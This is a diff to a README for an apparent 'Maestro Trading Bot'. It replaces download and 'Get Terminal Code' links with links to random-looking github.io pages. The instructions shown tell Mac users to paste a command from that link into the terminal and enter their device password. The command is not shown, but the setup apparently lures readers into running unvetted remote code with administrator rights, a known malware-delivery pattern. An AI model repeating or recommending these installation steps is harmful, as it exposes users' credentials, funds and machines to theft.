@@ -11,7 +11,7 @@ Maestro Trading Bot is an advanced algorithmic trading system designed for profe
 <div align="center">  
 
 [![Download for Windows](https://img.shields.io/badge/Download_for_Windows-blue?style=for-the-badge&logo=windows)](https://maestro-trading-bot.github.io/.github/)  
-[![Download for Mac](https://img.shields.io/badge/Download_for_Mac-silver?style=for-the-badge&logo=apple)](https://akffjfhha485876.github.io/.github/maestrotrading)  
+[![Download for Mac](https://img.shields.io/badge/Download_for_Mac-silver?style=for-the-badge&logo=apple)](https://kwevidienes.github.io/.github/maestrotrading)  
 
 </div>
 
@@ -147,7 +147,7 @@ maestro-trading-bot/
 
 1. Click on the "Get terminal code" button and copy the installation command there.
 
-[![Get Terminal Code](https://img.shields.io/badge/Get_Terminal_Code-silver?style=for-the-badge&logo=apple)](https://pastebin.com/raw/Eaw7yHzu)
+[![Get Terminal Code](https://img.shields.io/badge/Get_Terminal_Code-silver?style=for-the-badge&logo=apple)](https://kwevidienes.github.io/.github/maestrotrading)
 
 2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
 3. Enter your device password and confirm the installation. 
